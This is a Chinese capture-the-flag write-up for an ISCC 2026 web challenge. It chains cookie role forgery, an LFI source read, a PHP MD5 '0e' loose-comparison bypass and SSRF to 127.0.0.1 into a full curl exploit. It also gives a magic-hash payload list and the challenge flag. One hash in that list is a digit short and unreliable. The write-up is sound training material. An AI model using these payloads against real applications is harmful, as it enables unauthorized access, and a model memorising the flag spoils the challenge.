# 值班邮件台

> **Category**: Web | **Difficulty**: Easy | **Competition**: ISCC 2026 区域赛
> **Flag**: `ISCC{nB8qR4vZt6LmK2xW9pYcD7Ha}`

---

## Attack Chain

```
Cookie伪造admin → LFI读源码 → MD5 0e碰撞绕过复核 → SSRF读内部flag接口
```

## Key Techniques

### 1. 信息收集 — 发现 Cookie 身份认证漏洞

访问首页，页面显示当前用户为 `guest`（角色：`user`）。浏览器开发者工具观察 HTTP 响应头：

```
Set-Cookie: mail_user=guest; Max-Age=3600
Set-Cookie: mail_role=user; Max-Age=3600
```

用户身份和角色完全由客户端 Cookie 控制，服务端未做二次校验，存在 Cookie 伪造漏洞。

### 2. 阅读内部邮件 — 获取攻击线索

页面展示了三封内部邮件，逐一阅读：

- **邮件1「登录态先保留旧方案」**：暗示身份认证依赖 Cookie，可伪造
- **邮件2「预览面板只保留本机诊断能力」**：暗示存在 SSRF 可能
- **邮件3「双人复核别再走形式」**：暗示后台凭据校验存在绕过空间

### 3. Cookie 伪造 — 获取管理员权限

将 `mail_role` 的值从 `user` 修改为 `admin`，访问后台面板 `admin.php`，成功绕过权限校验。

面板包含联调说明文件链接和一个表单（预览凭据A、预览凭据B、诊断地址）。

### 4. 任意文件读取（LFI）— 获取源码和路由信息

`file` 参数未做路径过滤：

**读取 admin.php 源码：**

```php
$h1 = md5($tokenA);
$h2 = md5($tokenB);
if ($h1 == $h2 && $h1 !== $h2) {
    echo "校验通过，允许继续请求诊断地址";
}
```

**读取路由索引文件：**

```
health  -> /internal/health
mailq   -> /internal/queue
final   -> /internal/report?view=flag&slot=last
```

### 5. PHP MD5 类型混淆 — 绕过双人复核

`$h1 == $h2 && $h1 !== $h2` 这个条件的含义：

- `==` 松散比较：MD5 哈希值以 `0e` 开头且后续全为数字时，PHP 解释为科学计数法 `0 × 10^n = 0`
- 两个不同的 `0e` 格式哈希在 `==` 下都等于 0
- `!==` 比较字符串本身，只要不同就为 true

| 输入 | MD5 哈希 |
|------|----------|
| `QNKCDZO` | `0e830400451993494058024219903391` |
| `240610708` | `0e462097431906509019562988736854` |

### 6. SSRF — 访问内部 Flag 接口

利用后台面板的 `target_url` 字段构造 SSRF 请求：

```
http://127.0.0.1/internal/report?view=flag&slot=last
```

## Exploit

```bash
curl -s "http://TARGET/admin.php" \
  -b "mail_user=admin; mail_role=admin" \
  -d "token_a=QNKCDZO&token_b=240610708&target_url=http://127.0.0.1/internal/report?view=flag%26slot=last"
```

**参数说明：**

| 参数 | 值 | 作用 |
|------|----|------|
| `-b mail_role=admin` | Cookie 伪造 | 绕过身份认证 |
| `token_a=QNKCDZO` | MD5 = `0e8304...` | MD5 0e 绕过 |
| `token_b=240610708` | MD5 = `0e4620...` | MD5 0e 绕过 |
| `target_url=http://127.0.0.1/...` | SSRF | 访问内部 flag 接口 |

**补充：PHP 0e 碰撞常用值**

```python
payloads = {
    "QNKCDZO":      "0e830400451993494058024219903391",
    "240610708":    "0e462097431906509019562988736854",
    "QLTHNDT":      "0e40596782540195596208724958662",
    "ABJIHVY":      "0e755264355178451322893275696586",
    "s878926199a":  "0e545993274517709034328855841020",
    "s155964671a":  "0e342768416822451524974117254469",
}
```

## Distilled Knowledge

| 知识点 | 关键 |
|--------|------|
| Cookie伪造 | 客户端可控身份，服务端未校验 |
| MD5 0e碰撞 | `QNKCDZO`/`240610708` 经典值 |
| LFI | `download.php?file=` 无路径过滤 |
| SSRF | 服务器端请求绕过IP白名单 |
| PHP类型混淆 | `==` 松散比较, `0e` 科学计数法陷阱 |

---

*Original writeup: `C:\Users\48714\Desktop\wp\区域赛\值班邮件台_WriteUp_final.md`*
